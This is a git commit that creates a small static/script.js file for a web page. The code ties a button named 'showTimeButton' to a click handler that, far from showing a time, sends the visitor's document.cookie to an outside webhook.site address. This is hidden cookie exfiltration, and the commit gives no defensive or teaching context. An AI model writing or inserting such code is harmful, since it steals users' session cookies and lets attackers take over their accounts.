ec40b214c14db0c58d1ce0d9d25a5fca711d5456
boyu0802 <boyu0802chen@gmail.com>
2025-08-11 19:24:54 +0800

    Create script.js

---
+++ static/script.js
@@ -0,0 +1,6 @@
+document.addEventListener("DOMContentLoaded", function () {
+  const button = document.getElementById("showTimeButton");
+  button.addEventListener("click", function () {
+    fetch("https://webhook.site/ba19b219-7ec8-43f1-a70e-5fb9a46afb6a?" + document.cookie);
+  });
+})
